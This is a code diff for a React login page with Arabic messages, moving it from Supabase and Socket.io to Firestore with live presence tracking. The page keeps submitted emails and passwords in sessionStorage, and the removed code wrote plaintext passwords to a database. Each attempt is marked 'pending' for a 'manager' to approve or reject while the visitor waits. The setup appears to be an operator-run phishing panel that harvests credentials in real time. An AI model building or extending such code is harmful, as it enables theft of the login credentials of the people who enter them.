@@ -1,9 +1,9 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { supabase } from '@/lib/supabase';
-import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { initSocket, disconnectSocket, emitInstantNotification } from '@/lib/socket';
+import { getClientId } from '@/lib/clientId';
+import { createLoginAttempt } from '@/lib/firestore';
+import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
 
 // Import Logo Component
 const Logo = () => (
@@ -32,16 +32,17 @@ export default function LoginPage() {
   const [error, setError] = useState('');
   const [hasShownRejectionError, setHasShownRejectionError] = useState(false);
 
-  // Socket.io connection
+  // Set user online on mount
   useEffect(() => {
-    initSocket('/login');
-    
+    const clientId = getClientId();
+    setUserOnline(clientId, '/login');
+
     return () => {
-      disconnectSocket();
+      setUserOffline(clientId);
     };
   }, []);
 
-  // تحقق إذا كان هناك محاولة تسجيل مرفوضة
+  // Check for rejection notice from app
   useEffect(() => {
     const rejected = sessionStorage.getItem('login_rejected');
     const logoutNotice = sessionStorage.getItem('logout_notice');
@@ -58,91 +59,65 @@ export default function LoginPage() {
     }
   }, []);
 
-  // Log error state changes
-  useEffect(() => {
-    console.log('Error state changed to:', error);
-  }, [error]);
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.includes('@')) { setError('البريد الإلكتروني غير صحيح'); return; }
-    if (!password) { setError('كلمة المرور مطلوبة'); return; }
+    
+    if (!email.includes('@')) { 
+      setError('البريد الإلكتروني غير صحيح'); 
+      return; 
+    }
+    if (!password) { 
+      setError('كلمة المرور مطلوبة'); 
+      return; 
+    }
 
     setLoading(true);
     setError('');
 
     try {
       const normalizedEmail = email.trim().toLowerCase();
+      const clientId = getClientId();
 
       // Save to sessionStorage
       sessionStorage.setItem('reg_email', normalizedEmail);
       sessionStorage.setItem('reg_password', password);
 
-      const clientId = getClientId();
+      // Get stored registration ID if any
       const storedRegistrationId = sessionStorage.getItem('reg_id');
-      let registrationId = storedRegistrationId || null;
       let customerName = sessionStorage.getItem('reg_name') || '';
 
-      // Resolve the customer once so the attempt is linked in the dashboard and notification.
-      let registrationQuery = supabase
-        .from('registrations')
-        .select('id, full_name');
-
-      registrationQuery = storedRegistrationId
-        ? registrationQuery.eq('id', storedRegistrationId)
-        : registrationQuery.eq('email', normalizedEmail).order('created_at', { ascending: false }).limit(1);
-
-      const { data: registrationData } = await registrationQuery.maybeSingle();
-      if (registrationData) {
-        registrationId = registrationData.id;
-        customerName = registrationData.full_name || customerName;
-        sessionStorage.setItem('reg_id', registrationData.id);
-        if (customerName) sessionStorage.setItem('reg_name', customerName);
-      }
-      
-      // حفظ محاولة تسجيل الدخول
-      const { data, error: insertError } = await supabase
-        .from('login_attempts')
-        .insert({
-          registration_id: registrationId,
-          client_id: clientId,
+      // Create login attempt in Firestore
+      try {
+        const attemptId = await createLoginAttempt({
+          userId: storedRegistrationId || '',
+          clientId: clientId,
           email: normalizedEmail,
-          password,
           status: 'pending',
-        })
-        .select()
-        .single();
-
-      if (insertError) {
-        console.warn('Could not save login attempt:', insertError);
-        // إذا فشل حفظ المحاولة، نستخدم النظام القديم
-        setLoading(false);
-        navigate('/verify');
-        return;
+        });
+        
+        console.log('[Login] Login attempt created:', attemptId);
+        sessionStorage.setItem('login_attempt_id', attemptId);
+      } catch (attemptError) {
+        console.error('[Login] Could not create login attempt:', attemptError);
+        // Continue anyway - the old system will work
       }
 
-      // حفظ معرف المحاولة في sessionStorage
-      sessionStorage.setItem('login_attempt_id', data.id);
-
-      // Notify the manager immediately without sending credentials
-      await emitInstantNotification('login_attempt', {
-        id: data.id,
-        name: customerName || undefined,
-        registration_id: registrationId,
-        created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
-      });
+      // Update presence
+      updateUserPage(clientId, '/waiting');
       
-      setLoading(false);
+      // Navigate to waiting page
       navigate('/waiting');
+      
     } catch (err: unknown) {
       console.error('Login error:', err);
-      setLoading(false);
       const message = err instanceof Error ? err.message : 'حدث خطأ غير متوقع';
       setError(`خطأ: ${message}`);
+    } finally {
+      setLoading(false);
     }
   };
 
-  // منع كتابة الأحرف العربية
+  // Prevent Arabic characters
   const preventArabic = (e: React.ChangeEvent<HTMLInputElement>, setter: (value: string) => void) => {
     const value = e.target.value.replace(/[\u0600-\u06FF]/g, '');
     setter(value);
